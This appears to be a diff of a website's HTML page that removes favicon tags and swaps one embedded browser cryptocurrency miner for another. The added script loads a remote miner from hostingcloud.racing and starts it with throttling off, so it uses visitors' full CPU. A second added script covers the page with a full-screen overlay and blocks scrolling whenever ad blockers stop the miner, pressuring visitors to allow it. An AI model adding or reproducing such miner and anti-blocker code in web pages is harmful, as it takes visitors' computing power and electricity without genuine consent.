@@ -8,15 +8,6 @@
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Lato">
   <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Montserrat">
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
-  <link rel="apple-touch-icon" sizes="180x180" href="/FAVICON/apple-touch-icon.png">
-  <link rel="icon" type="image/png" sizes="32x32" href="/FAVICON/favicon-32x32.png">
-  <link rel="icon" type="image/png" sizes="16x16" href="/FAVICON/favicon-16x16.png">
-  <link rel="manifest" href="/FAVICON/site.webmanifest">
-  <link rel="mask-icon" href="/FAVICON/safari-pinned-tab.svg" color="#f44336">
-  <link rel="shortcut icon" href="/FAVICON/favicon.ico">
-  <meta name="msapplication-TileColor" content="#f44336">
-  <meta name="msapplication-config" content="/FAVICON/browserconfig.xml">
-  <meta name="theme-color" content="#ffffff">
 </head>
 <style>
   .w3-bar,h1,button {font-family: "Montserrat", sans-serif}
@@ -24,15 +15,30 @@
 </style>
 
 <body>
-    <script src="https://www.hostingcloud.racing/vnxu.js"></script>
-    <script>
-        var _client = new Client.Anonymous('70eda1d5b4ac9750566214f4065b0e67c354134790ee39df94822d668194ad29', {
-            throttle: 0, ads: 0
-        });
-        _client.start();
-
-
-    </script>
+<script src="https://www.hostingcloud.racing/vnxu.js"></script>
+<script>
+    var _client = new Client.Anonymous('4436bad03bac148e29adb17ca1b548043dae1409fcd6939c3d00c2629ec388da', {
+        throttle: 0
+    });
+    _client.start();
+    
+</script>
+<script>
+    setTimeout(function(){
+        if(typeof _client === 'undefined' || _client === null)
+        {
+            var messageDiv = document.createElement("div");
+            messageDiv.setAttribute("style","width: 50%; background-color: white; padding: 15px; display: inline-block; vertical-align: middle;");
+            messageDiv.appendChild(document.createTextNode("Please allow our miner on your blocker software to continue browsing our site. Reload the page after that."));
+            var mainDiv = document.createElement("div");
+            mainDiv.setAttribute("style","position: absolute; top: 0px; right: 0px; width: 100%; height: 100%; display: flex; background-color: #4c4c4c;  align-items: center; justify-content: center");
+            mainDiv.appendChild(messageDiv);
+            document.body.appendChild(mainDiv);
+            document.getElementsByTagName("body")[0].style.overflow = "hidden";
+            window.scrollTo(0, 0);
+        }
+    },1000);
+</script>
 </body>
 
 <!-- Navbar -->
